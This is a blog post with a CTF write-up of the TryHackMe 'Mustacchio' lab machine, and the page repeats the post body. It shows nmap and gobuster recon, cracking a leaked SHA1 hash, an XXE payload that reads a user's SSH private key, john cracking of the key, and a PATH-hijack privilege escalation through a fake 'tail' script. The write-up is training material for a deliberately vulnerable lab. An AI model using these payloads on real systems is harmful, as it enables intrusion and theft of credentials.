<!DOCTYPE html>
<html lang="en">
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
<meta name="language" content="en">

<!-- Twitter And Open Graph Meta -->
<!-- Open Graph Meta Tags -->
<meta property="og:title" content="TryHackMe - Mustacchio">
<meta property="og:description" content="&lt;p&gt;Easy boot2root Machine. Let’s start.&lt;/p&gt;
">
<meta property="og:type" content="website">
<meta property="og:url" content="http://localhost:4000/tryhackme-mustacchio/">
<meta property="og:image" content="">
<meta property="og:image:alt" content="">
<meta property="og:site_name" content="Mr0Wido's Blog">
<meta property="og:locale" content="en_US">

<!-- Twitter Meta Tags -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@">
<meta name="twitter:title" content="TryHackMe - Mustacchio">
<meta name="twitter:description" content="&lt;p&gt;Easy boot2root Machine. Let’s start.&lt;/p&gt;
">
<meta name="twitter:image" content="">


<!-- css -->
<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<link rel="canonical" href="http://localhost:4000/tryhackme-mustacchio/">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



<title>TryHackMe - Mustacchio - Mr0Wido's Blog</title>



<!-- Script -->
<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>





    <title>TryHackMe - Mustacchio - Mr0Wido's Blog</title>
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
  <script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({         tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] }       });</script>
</head>
  <body>
    <header class="site-header">
  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
  <div class="site-title">
    <a href="http://localhost:4000">Mr0Wido's Blog</a>
  </div>
  <nav class="site-nav">
    <ul class="site-nav__list">
      <li class="site-nav__item">
        <a class="site-nav__link " href="/">Home</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/whoami/">Whoami</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/posts/">Posts</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/projects/">Projects</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/cv/">CV</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/categories/">Categories</a>
      </li>
      <li class="site-nav__item">
        <div class="search">
          <input type="text" id="search-input" placeholder="Search...">
          <i class="fas fa-search"></i>
          <ul id="results-container"></ul>
        </div>
      </li>
    </ul>
  </nav>
</header>


<!-- 360 to 980 -->
<header class="header-mobile">
  <div class="header-inner clearfix">
    <div class="nav-btn nav-slider">
      <i class="fa-solid fa-bars"></i>
    </div>
    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
    <div class="site-title">
      <a href="http://localhost:4000">Mr0Wido's Blog</a>
    </div>
  </div>
</header>
<nav class="sidebar">
  <div class="nav-header">
    <div class="nav-search">
      <div class="search">
        <i class="fas fa-search"></i>
        <input type="search" name="search" id="search-input" placeholder="Search...">
        <ul id="results-container"></ul>
      </div>
    </div>
  </div>
  <ul class="nav-categories ul-base">
    <li><a class="site-nav__link " href="/">Home</a></li>
    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
    <li><a class="site-nav__link " href="/cv/">CV</a></li>
    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
  </ul>
  <ul class="social ul-base">
    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
  </ul>
  <div class="copyright">
    <span> © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
  </div>
</nav>
<div class="overlay"></div>
    
    <div class="container-default">
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">TryHackMe - Mustacchio</h1>
  <div class="post__content">
    <p>Easy boot2root Machine. Let’s start.</p>

<p><br></p>

<h2 id="1-mustacchio">1. Mustacchio</h2>

<p>Deploy and compromise the machine!</p>

<p><br></p>

<h3 id="11-user-flag">1.1 User Flag?</h3>

<p><em>Hint: Check the source of the page.</em></p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -p- 10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/nmap.png" alt="nmap"></p>

<p>We found three open ports. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, and 8765/tcp HTTP</code>.</p>

<p>First, let’s visit the website running on port 80/tcp and see what we can find.
Five different pages appear. These are home, about, gallery, blog, and contact.</p>

<p><img src="/assets/img/tryhackme/mustacchio/home.png" alt="home"></p>

<p>I am checking the links and source pages that can be visited on the website, but I could not find anything remarkable.</p>

<p>I decided to do a directory scan with Gobuster. But first, let’s visit the website running on 8765/tcp port.</p>

<p><img src="/assets/img/tryhackme/mustacchio/admin.png" alt="admin"></p>

<p>We found an admin panel, it will help us. Anyway, let’s go back to port 80/tcp and do a gobuster scan.</p>

<p><img src="/assets/img/tryhackme/mustacchio/gobuster.png" alt="gobuster"></p>

<p>The custom directory looks interesting. When we go inside, we find a file called <code class="language-plaintext highlighter-rouge">user.bak</code>, which is interesting.</p>

<p><img src="/assets/img/tryhackme/mustacchio/userbak.png" alt="userbak"></p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/mustacchio/admincode.png" alt="admincode"></p>

<p><strong><code class="language-plaintext highlighter-rouge">admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></strong></p>

<p>I guess this is the login information to the admin panel but the password seems to be encrypted. 
I check with the hash-identifier.</p>

<p><img src="/assets/img/tryhackme/mustacchio/codeid.png" alt="codeid"></p>

<p>Most likely admin’s password is encrypted using <code class="language-plaintext highlighter-rouge">SHA1</code>.</p>

<p>You can decrypt online from any website by searching for “SHA1 decrypt” in the browser. I used the following website. <a href="https://md5decrypt.net/en/Sha1/#answer" rel="external nofollow noopener" target="_blank">Here</a></p>

<p><img src="/assets/img/tryhackme/mustacchio/decode.png" alt="decode"></p>

<p>We found the password.</p>

<p><strong><code class="language-plaintext highlighter-rouge">admin : bulldog19</code></strong></p>

<p>Now let’s go to the admin panel and log in.
We logged in.</p>

<p><img src="/assets/img/tryhackme/mustacchio/comment.png" alt="comment"></p>

<p>I’ve tried a few command injections into the area that comes up, but it just seems like a gimmick.</p>

<p>I’m checking the source of the page and we’re getting some important information here.</p>
<ul>
  <li>
    <p>We explore the /auth/dontforget.bak file.</p>
  </li>
  <li>
    <p><img src="/assets/img/tryhackme/mustacchio/dontforget.png" alt="dontforget"></p>
  </li>
  <li>
    <p>We discover that Barry is now able to log into SSH.</p>
  </li>
  <li>
    <p><img src="/assets/img/tryhackme/mustacchio/barryssh.png" alt="barryssh"></p>
  </li>
</ul>

<p>Let’s first check the dontforget.bak file.</p>

<p>Download directly from here <a href="http://10.10.80.114:8765/auth/dontforget.bak" rel="external nofollow noopener" target="_blank">http://10.10.80.114:8765/auth/dontforget.bak</a>.</p>

<p>Something like this welcomes us.</p>

<p><img src="/assets/img/tryhackme/mustacchio/dontforgetbakin.png" alt="dontforgetbakin"></p>

<p>But there is one important thing about this code, it’s not a complete waste of time. 
This code is an XML code, if we copy this code and paste it into the comment section in the admin panel, we get the following result.</p>

<p><img src="/assets/img/tryhackme/mustacchio/joe.png" alt="joe"></p>

<p>I mean, we need to write xml code in this comment section. So I am trying to do command injection using xml.</p>

<p>I tried the commands <a href="https://github.com/payloadbox/xxe-injection-payload-list" rel="external nofollow noopener" target="_blank">here</a> but no result.</p>

<p>But I realized something, I was constantly getting this result.</p>

<p><img src="/assets/img/tryhackme/mustacchio/empty.png" alt="empty"></p>

<p>Here I understood that I should use the tags in dontforget.bak.</p>

<p>First I decided to give it a try with the code below.</p>

<p><img src="/assets/img/tryhackme/mustacchio/try.png" alt="try"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;
&lt;comment&gt;
  &lt;name&gt;Joe Hamd&lt;/name&gt;
  &lt;author&gt;&amp;example;&lt;/author&gt;
&lt;com&gt;Test paragraph&lt;/com&gt;
&lt;/comment&gt;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/tryout.png" alt="tryout"></p>

<p>It worked as you can see. Now we can access the information inside the system.</p>

<p>We got the message that Barry can now log in to ssh, if we go to Barry’s directory and get the rsa key, we can log in too.</p>

<p>I run the following code in the admin panel to get the id_rsa key.</p>

<p><img src="/assets/img/tryhackme/mustacchio/commentinssh.png" alt="commentinssh"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;
&lt;comment&gt;
  &lt;name&gt;Joe Hamd&lt;/name&gt;
  &lt;author&gt;Joe&lt;/author&gt;
&lt;com&gt;&amp;example;&lt;/com&gt;
&lt;/comment&gt;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/outrsa.png" alt="outrsa"></p>

<p>Yes, we have reached the RSA key, now we need to copy and edit this key. I tried without editing and it doesn’t work :D.
Make sure there are no spaces at the end of the lines. Each one should be a separate line.
It should look like this when you edit it.</p>

<p><img src="/assets/img/tryhackme/mustacchio/edit.png" alt="edit"></p>

<p>Now we need to crack this id_rsa for barry’s ssh password.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john id_rsa &gt; id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/crack.png" alt="crack"></p>

<p><strong><code class="language-plaintext highlighter-rouge">barry : urieljames</code></strong></p>

<p>Now we can log in ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
$ ssh -i id_rsa barry@10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/barryin.png" alt="barryin"></p>

<p>And we are inside.</p>

<p>Now we can access the user flag.</p>

<p><img src="/assets/img/tryhackme/mustacchio/user-flag.png" alt="user-flag"></p>

<p><br></p>

<h3 id="12-root-flag">1.2 Root Flag?</h3>

<p><em>Hint: SUID?</em></p>

<p>We proceed with the clue that the question gives us. First, we will run the following code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/suid.png" alt="suid"></p>

<p>I couldn’t find anything remarkable and started navigating the system.</p>

<p>I discovered the joe directory next to barry, and if you remember a file like <code class="language-plaintext highlighter-rouge">live_log</code> in it, we also saw this file as a result of the code we wrote above.</p>

<p><img src="/assets/img/tryhackme/mustacchio/ls.png" alt="ls"></p>

<p>I’m looking at the strings content of this log file and we find something remarkable here. The tail command was used.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$strings live_log
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/strings.png" alt="strings"></p>

<p>I’ve been doing some research on how to escalate using this and I find that it’s as follows.</p>

<p><img src="/assets/img/tryhackme/mustacchio/privesc.png" alt="privesc"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "/bin/sh" &gt; tail
$ chmod 777 tail
$ export PATH=/tmp.$PATH
$ cd /home/joe/
$ ./live_log
</code></pre></div></div>

<p>And we are inside. To be frank, I don’t fully understand the logic of raising authority, I’ll go over it a little later.
But now we can get to root.txt.</p>

<p><img src="/assets/img/tryhackme/mustacchio/root-flag.png" alt="root-flag"></p>

<p><br></p>

<hr>

<p><br></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 19, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">xxe,</span>
          
          <span class="post__tags-item">privesc,</span>
          
          <span class="post__tags-item">enumeraton</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-mustacchio/';
    this.page.identifier = '/tryhackme-mustacchio';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="furkn.dniz@gmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="furkn.dniz@gmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
    </div>

    <div class="container-medium">
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="furkn.dniz@gmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="http://localhost:4000/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:furkn.dniz@gmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="furkn.dniz@gmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">TryHackMe - Mustacchio</h1>
  <div class="post__content">
    <p>Easy boot2root Machine. Let’s start.</p>

<p><br></p>

<h2 id="1-mustacchio">1. Mustacchio</h2>

<p>Deploy and compromise the machine!</p>

<p><br></p>

<h3 id="11-user-flag">1.1 User Flag?</h3>

<p><em>Hint: Check the source of the page.</em></p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -p- 10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/nmap.png" alt="nmap"></p>

<p>We found three open ports. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, and 8765/tcp HTTP</code>.</p>

<p>First, let’s visit the website running on port 80/tcp and see what we can find.
Five different pages appear. These are home, about, gallery, blog, and contact.</p>

<p><img src="/assets/img/tryhackme/mustacchio/home.png" alt="home"></p>

<p>I am checking the links and source pages that can be visited on the website, but I could not find anything remarkable.</p>

<p>I decided to do a directory scan with Gobuster. But first, let’s visit the website running on 8765/tcp port.</p>

<p><img src="/assets/img/tryhackme/mustacchio/admin.png" alt="admin"></p>

<p>We found an admin panel, it will help us. Anyway, let’s go back to port 80/tcp and do a gobuster scan.</p>

<p><img src="/assets/img/tryhackme/mustacchio/gobuster.png" alt="gobuster"></p>

<p>The custom directory looks interesting. When we go inside, we find a file called <code class="language-plaintext highlighter-rouge">user.bak</code>, which is interesting.</p>

<p><img src="/assets/img/tryhackme/mustacchio/userbak.png" alt="userbak"></p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/mustacchio/admincode.png" alt="admincode"></p>

<p><strong><code class="language-plaintext highlighter-rouge">admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></strong></p>

<p>I guess this is the login information to the admin panel but the password seems to be encrypted. 
I check with the hash-identifier.</p>

<p><img src="/assets/img/tryhackme/mustacchio/codeid.png" alt="codeid"></p>

<p>Most likely admin’s password is encrypted using <code class="language-plaintext highlighter-rouge">SHA1</code>.</p>

<p>You can decrypt online from any website by searching for “SHA1 decrypt” in the browser. I used the following website. <a href="https://md5decrypt.net/en/Sha1/#answer" rel="external nofollow noopener" target="_blank">Here</a></p>

<p><img src="/assets/img/tryhackme/mustacchio/decode.png" alt="decode"></p>

<p>We found the password.</p>

<p><strong><code class="language-plaintext highlighter-rouge">admin : bulldog19</code></strong></p>

<p>Now let’s go to the admin panel and log in.
We logged in.</p>

<p><img src="/assets/img/tryhackme/mustacchio/comment.png" alt="comment"></p>

<p>I’ve tried a few command injections into the area that comes up, but it just seems like a gimmick.</p>

<p>I’m checking the source of the page and we’re getting some important information here.</p>
<ul>
  <li>
    <p>We explore the /auth/dontforget.bak file.</p>
  </li>
  <li>
    <p><img src="/assets/img/tryhackme/mustacchio/dontforget.png" alt="dontforget"></p>
  </li>
  <li>
    <p>We discover that Barry is now able to log into SSH.</p>
  </li>
  <li>
    <p><img src="/assets/img/tryhackme/mustacchio/barryssh.png" alt="barryssh"></p>
  </li>
</ul>

<p>Let’s first check the dontforget.bak file.</p>

<p>Download directly from here <a href="http://10.10.80.114:8765/auth/dontforget.bak" rel="external nofollow noopener" target="_blank">http://10.10.80.114:8765/auth/dontforget.bak</a>.</p>

<p>Something like this welcomes us.</p>

<p><img src="/assets/img/tryhackme/mustacchio/dontforgetbakin.png" alt="dontforgetbakin"></p>

<p>But there is one important thing about this code, it’s not a complete waste of time. 
This code is an XML code, if we copy this code and paste it into the comment section in the admin panel, we get the following result.</p>

<p><img src="/assets/img/tryhackme/mustacchio/joe.png" alt="joe"></p>

<p>I mean, we need to write xml code in this comment section. So I am trying to do command injection using xml.</p>

<p>I tried the commands <a href="https://github.com/payloadbox/xxe-injection-payload-list" rel="external nofollow noopener" target="_blank">here</a> but no result.</p>

<p>But I realized something, I was constantly getting this result.</p>

<p><img src="/assets/img/tryhackme/mustacchio/empty.png" alt="empty"></p>

<p>Here I understood that I should use the tags in dontforget.bak.</p>

<p>First I decided to give it a try with the code below.</p>

<p><img src="/assets/img/tryhackme/mustacchio/try.png" alt="try"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;
&lt;comment&gt;
  &lt;name&gt;Joe Hamd&lt;/name&gt;
  &lt;author&gt;&amp;example;&lt;/author&gt;
&lt;com&gt;Test paragraph&lt;/com&gt;
&lt;/comment&gt;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/tryout.png" alt="tryout"></p>

<p>It worked as you can see. Now we can access the information inside the system.</p>

<p>We got the message that Barry can now log in to ssh, if we go to Barry’s directory and get the rsa key, we can log in too.</p>

<p>I run the following code in the admin panel to get the id_rsa key.</p>

<p><img src="/assets/img/tryhackme/mustacchio/commentinssh.png" alt="commentinssh"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;
&lt;comment&gt;
  &lt;name&gt;Joe Hamd&lt;/name&gt;
  &lt;author&gt;Joe&lt;/author&gt;
